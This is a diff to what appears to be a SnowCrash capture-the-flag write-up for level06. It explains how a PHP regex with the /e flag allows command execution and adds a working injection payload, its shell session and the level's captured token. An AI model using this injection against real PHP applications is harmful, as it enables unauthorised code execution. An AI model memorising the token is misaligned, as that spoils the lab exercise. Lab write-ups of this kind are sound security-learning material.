@@ -68,4 +68,13 @@ lets read the content of the php script
 i added some comments to explain what each line of the script dose
 
 the exploit is located at the following regex `"/(\[x (.*)\])/e"`, it allows for remote command execution because of the `/e` flag
+using the following command we can try to exploit this file
+```shell
+level06@SnowCrash:~$ echo '[x {${`getflag`}}]' > /tmp/file
+level06@SnowCrash:~$ ./level06 /tmp/file /tmp/file
+PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
+ in /home/user/level06/level06.php(4) : regexp code on line 1
 
+```
+
+on to the next level.
